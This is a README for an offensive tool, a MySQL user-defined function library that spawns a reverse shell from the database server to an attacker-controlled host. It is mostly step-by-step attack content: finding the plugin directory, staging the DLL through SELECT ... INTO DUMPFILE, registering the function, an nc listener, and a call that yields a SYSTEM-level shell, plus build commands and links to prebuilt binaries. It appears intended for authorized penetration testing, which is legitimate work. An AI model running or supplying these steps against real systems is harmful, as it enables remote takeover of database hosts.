# MySQL UDF Reverse Shell

## What is it

MySQL User Defined Function (UDF) that spawns a reverse shell back to an attacker-controlled host. 

- **Windows** — spawns `cmd.exe` via `CreateProcess` with `STARTF_USESTDHANDLES`,
  using the connected socket as the child's standard handles.
- **Linux** — `dup2`s the socket onto fd 0/1/2 and `exec`s `/bin/sh`.

Enspired by [*"MySQL UDF Exploitation"*](https://osandamalith.com/2018/02/11/mysql-udf-exploitation/) by Osanda Malith Jayathissa (@OsandaMalith)
Based on the advisory [*"Using UDF in Penetration Testing Part 2"*](https://www.obrela.com/resources/advisories/using-udf-in-penetration-testing-part-2) by Obrela Labs.

**For authorized penetration testing / lab use only.**

## Download

Prebuilt, statically-linked binaries are attached to the
[latest release](https://github.com/vblonsky/MySQL_UDF_revshell/releases/latest)
(they are not stored in the git tree):

| Target         | Asset                        |
|----------------|------------------------------|
| Windows x86-64 | `reverseShell_udf_win64.dll` |
| Windows i386   | `reverseShell_udf_win32.dll` |
| Linux x86-64   | `reverseShell_udf_linux64.so`|
| Linux i386     | `reverseShell_udf_linux32.so`|


Tested on **Microsoft Windows 11 Pro x64 10.0.26100 N/A Build 26100, MySQL 8.0.42**.

### 1. Find the plugin directory

```sql
mysql> show variables like 'plugin_dir';
+---------------+----------------------------------------------------------+
| Variable_name | Value                                                    |
+---------------+----------------------------------------------------------+
| plugin_dir    | C:\Program Files\MySQL\MySQL Server 8.0\lib\plugin\      |
+---------------+----------------------------------------------------------+
```

### 2. Copy the library into the plugin directory

Copy the matching binary for the target architecture, e.g. `reverseShell_udf_win64.dll`
on a 64-bit Windows host, into the directory shown above. Download it from the
[latest release](https://github.com/vblonsky/MySQL_UDF_revshell/releases/latest).


### 3. Register the function

```sql
mysql> create function reverseShell_udf returns integer soname 'reverseShell_udf_win64.dll';
Query OK, 0 rows affected (0.00 sec)
```

On Linux use the `.so` name instead:

```sql
mysql> create function reverseShell_udf returns integer soname 'reverseShell_udf_linux64.so';
```

### 4. Start a listener and trigger the shell

Attacker machine:

```console
$ nc -lvvp 4444
listening on [any] 4444 ...
```

Then from the SQL console:

```sql
mysql> select reverseShell_udf('10.10.14.7','4444');
+---------------------------------------------+
| reverseShell_udf('10.10.14.7','4444')        |
+---------------------------------------------+
|                                           0 |
+---------------------------------------------+
1 row in set (0.01 sec)
```

The listener receives the connection:

```console
connect to [10.10.14.7] from target [10.10.14.22] 49672
Microsoft Windows [Version 10.0.26100.xxxx]

C:\Program Files\MySQL\MySQL Server 8.0\data>whoami
nt authority\system
```

### 5. Uploading the library when you cannot write to `plugin_dir` directly

Write the DLL to any writable directory first, then stage it through a table and
`SELECT ... INTO DUMPFILE`:

```sql
mysql> create table shell(line blob);
mysql> insert into shell values(load_file('C:\\Windows\\Temp\\reverseShell_udf_win64.dll'));
mysql> select * from shell into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 8.0\\lib\\plugin\\reverseShell_udf_win64.dll';
mysql> create function reverseShell_udf returns integer soname 'reverseShell_udf_win64.dll';
mysql> select reverseShell_udf('10.10.14.7','4444');
```

### Cleanup

```sql
mysql> drop function reverseShell_udf;
```

## Build with script

Tested on **macOS (Intel)**.

### Requirements

```console
$ brew install mingw-w64      # Windows toolchain (x86_64 + i686)
```

Linux targets are cross-built with Docker:

- Docker Desktop (or a Linux host with `gcc-multilib`)

### Build

```console
$ ./build.sh
```

The script auto-detects a native `gcc` with 32-bit multilib support on Linux and
falls back to Docker otherwise. All artifacts are built statically and stripped
(no debug info).

### Manual compilation

Windows (cross, from macOS/Linux):

```console
$ x86_64-w64-mingw32-gcc -shared -O2 -s -nostdlib -fno-builtin -DUDF_MINIMAL \
      -Wl,--entry,DllMain -o reverseShell_udf_win64.dll src/reverseShell_udf.c -lws2_32 -lkernel32
$ i686-w64-mingw32-gcc   -shared -O2 -s -nostdlib -fno-builtin -DUDF_MINIMAL \
      -Wl,--entry,_DllMain@12 -o reverseShell_udf_win32.dll src/reverseShell_udf.c -lws2_32 -lkernel32
```

Linux:

```console
$ gcc -m64 -shared -fPIC -O2 -s -nostdlib -fno-stack-protector \
      -o reverseShell_udf_linux64.so src/reverseShell_udf.c
$ gcc -m32 -shared -fPIC -O2 -s -nostdlib -fno-stack-protector \
      -o reverseShell_udf_linux32.so src/reverseShell_udf.c
```

## Repository layout

```
.
├── src/reverseShell_udf.c   # single cross-platform source (Windows + Linux)
├── build.sh                 # build script (macOS Intel, cross-compilation)
└── README.md
```

The exported symbols are `reverseShell_udf` and `reverseShell_udf_init`.
The binary is self-contained: the Windows DLL imports only `KERNEL32.dll` and
`WS2_32.dll`, and the Linux `.so` has no `DT_NEEDED` entries.

Compiled binaries are distributed through
[GitHub Releases](https://github.com/vblonsky/MySQL_UDF_revshell/releases) and
are ignored by git (see `.gitignore`); run `./build.sh` to rebuild them locally.
